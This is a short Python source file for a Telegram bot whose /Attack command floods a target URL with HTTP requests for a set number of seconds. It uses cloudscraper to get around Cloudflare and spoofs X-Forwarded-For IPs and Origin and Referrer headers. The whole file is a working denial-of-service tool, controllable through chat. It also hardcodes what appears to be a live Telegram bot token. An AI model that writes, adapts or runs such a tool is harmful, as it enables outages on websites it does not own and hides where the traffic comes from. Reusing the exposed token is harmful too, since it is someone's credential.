import requests
import random
import string
import json
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
from cloudscraper import create_scraper

# Telegram bot token
TOKEN = "6311954830:AAFelhOxi5GkzecWwiQIccxvXnfc1rppOQI"

# Create scraper
scraper = create_scraper()

def random_byte():
    return str(random.randint(0, 255))

def attack(update: Update, context: CallbackContext) -> None:
    args = context.args
    if len(args) < 2:
        update.message.reply_text("Usage: /Attack <url> <time_in_seconds>")
        return
    
    url = args[0]
    time = int(args[1])

    for _ in range(time):
        try:
            response = scraper.get(url)
            response_json = response.json()

            # Ensure all required keys are present in the JSON response
            if "request" in response_json and "headers" in response_json["request"]:
                cookie = response_json["request"]["headers"].get("cookie", "")
                useragent = response_json["request"]["headers"].get("User-Agent", "")

                rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
                ip = '.'.join([random_byte() for _ in range(4)])

                headers = {
                    'User-Agent': useragent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Upgrade-Insecure-Requests': '1',
                    'cookie': cookie,
                    'Origin': f'http://{rand}.com',
                    'Referrer': f'http://google.com/{rand}',
                    'X-Forwarded-For': ip
                }

                requests.get(url, headers=headers)
            else:
                print("Required keys not found in JSON response")
        except Exception as e:
            print(f"An error occurred: {e}")

def main():
    updater = Updater(TOKEN, use_context=True)
    dispatcher = updater.dispatcher
    dispatcher.add_handler(CommandHandler("Attack", attack))
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
                
